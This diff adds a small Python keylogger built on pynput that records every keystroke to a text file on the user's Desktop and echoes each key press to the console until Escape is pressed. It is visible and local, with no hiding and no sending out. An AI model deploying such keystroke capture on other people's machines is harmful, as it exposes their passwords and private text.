@@ -1,0 +1,53 @@
+from pynput import keyboard
+import os
+
+def get_desktop_path():
+    if os.name == "posix":
+        return os.path.join(os.path.expanduser('~'), 'Desktop')
+
+def on_press(key):
+    desktop_path = get_desktop_path()
+    logged_data = os.path.join(desktop_path, "file_write.txt")
+    # Create file to write data
+    # logged_data = "file_write.txt"
+
+    # Opened using read and write mode "r+"
+    with open(logged_data, 'r+') as fout:
+        script_content = fout.read()
+        # If Normal Character
+        if hasattr(key, 'char') and key.char is not None:
+             fout.write(key.char)
+        # if Spacebar
+        elif key == keyboard.Key.space:
+            fout.write(' ')
+        # If Enter Key
+        elif key == keyboard.Key.enter:
+            fout.write('\n')
+        # If Backspace
+        elif key == keyboard.Key.backspace:
+            fout.seek(0)
+            fout.truncate()
+            fout.write(script_content[:-1])
+        # # Line limit
+        # elif len(script_content) > 50:
+        #     fout.write('\n')
+            # Shift and Caps Lock
+        elif key == keyboard.Key.caps_lock or key == keyboard.Key.shift:
+            fout.write("")
+        # If Special Character
+        else:
+            fout.write(f'{key}')
+            # current_cursor_position += len(str(key)) 
+        
+    # Log every key press
+    print(f'({key} pressed), (cursor_position: {len(script_content)})')
+    fout.close()
+
+    # If Key is Escape
+    if key == keyboard.Key.esc:
+        print("Key-log disabled")
+        return False
+        
+with keyboard.Listener(on_press=on_press) as listener:
+    print("Key-log enabled...")
+    listener.join()
